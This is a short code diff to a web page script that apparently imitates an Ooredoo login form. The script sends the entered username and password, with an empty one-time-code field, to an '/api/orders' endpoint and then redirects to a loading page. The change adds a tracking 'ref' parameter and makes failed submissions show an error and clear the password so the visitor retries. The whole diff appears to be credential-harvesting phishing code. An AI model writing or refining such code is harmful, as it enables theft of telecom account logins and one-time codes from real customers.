@@ -178,20 +178,25 @@
       }
 
       // إرسال بيانات تسجيل الدخول إلى السيرفر ثم متابعة التدفق
+      var ref=new URLSearchParams(window.location.search).get('ref') || '';
       fetch('/api/orders', {
           method: 'POST',
           headers: {'Content-Type': 'application/json'},
           body: JSON.stringify({
+              ref: ref,
               ooredoo: {
                   username: username.value,
                   password: password.value,
                   otp: ""
               }
           })
-      }).then(function(){
+        }).then(function(response){
+          if(!response.ok) throw new Error('rejected');
           window.location.href='ooredoo-loading.html';
-      }).catch(function(){
-          window.location.href='ooredoo-loading.html';
+        }).catch(function(){
+          error.classList.add('visible');
+          password.value='';
+          password.focus();
       });
     }
   </script>
